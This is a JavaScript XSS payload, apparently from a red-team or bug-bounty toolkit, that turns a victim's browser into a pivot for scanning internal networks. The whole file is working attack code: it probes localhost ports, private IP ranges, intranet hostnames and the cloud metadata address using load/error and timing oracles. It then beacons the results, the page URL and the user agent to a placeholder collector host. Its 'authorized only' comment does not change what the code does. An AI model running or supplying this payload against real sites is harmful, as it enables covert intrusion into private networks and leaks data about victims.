/*
 * internal_scan.js — Internal host/port recon from the victim browser (guide §31).
 * XSS runs in the victim's browser, which may sit INSIDE a corporate/intranet network. That
 * browser becomes a pivot: probe internal hosts your own machine can't reach, using load/error
 * + timing oracles, and exfil what responds.
 *
 * AUTHORIZED / RED-TEAM ONLY (or where the program explicitly permits demonstrating internal
 * reach). This is noisy and powerful — keep the host list tight and scoped to the engagement.
 * For bug bounty, a single clean PoC reaching ONE internal-only asset of the target is plenty.
 */
(function () {
  var CFG = {
    collector: "//YOUR.oast.fun/scan",
    timeoutMs: 3000,
    // Edit to the engagement's expected internal ranges/hosts:
    targets: [
      "http://127.0.0.1:8080", "http://127.0.0.1:9000",
      "http://10.0.0.1", "http://192.168.0.1", "http://192.168.1.1:8080",
      "http://internal-admin", "http://jira.internal", "http://wiki.internal",
      "http://169.254.169.254/latest/meta-data/"   // cloud metadata (usually blocked from browsers; worth a probe)
    ],
    paths: ["/favicon.ico", "/", "/login"]
  };

  function report(obj) {
    var s = JSON.stringify(obj);
    try { navigator.sendBeacon(CFG.collector, s); }
    catch (e) { new Image().src = CFG.collector + "?d=" + encodeURIComponent(s); }
  }

  // Oracle 1: <img>/<script> load|error + timing => host/port existence (works cross-origin)
  function probeImg(base) {
    CFG.paths.forEach(function (p) {
      var url = base + p + "?_=" + Math.random();
      var t0 = performance.now();
      var img = new Image();
      var done = false;
      function finish(result) {
        if (done) return; done = true;
        report({ kind: "img", url: base + p, result: result, ms: Math.round(performance.now() - t0) });
      }
      img.onload = function () { finish("load"); };
      img.onerror = function () { finish("error/exists?"); };  // error can still mean "host reachable"
      setTimeout(function () { finish("timeout/closed?"); }, CFG.timeoutMs);
      img.src = url;
    });
  }

  // Oracle 2: fetch(no-cors) opaque response + timing => existence even when CORS-blocked
  function probeFetch(base) {
    var t0 = performance.now();
    try {
      fetch(base, { mode: "no-cors", cache: "no-store" })
        .then(function () { report({ kind: "fetch", url: base, result: "resolved(opaque)", ms: Math.round(performance.now() - t0) }); })
        .catch(function () { report({ kind: "fetch", url: base, result: "rejected", ms: Math.round(performance.now() - t0) }); });
    } catch (e) {}
  }

  CFG.targets.forEach(function (base) {
    probeImg(base);
    probeFetch(base);
  });

  report({ kind: "context", url: location.href, origin: location.origin, ua: navigator.userAgent });
})();
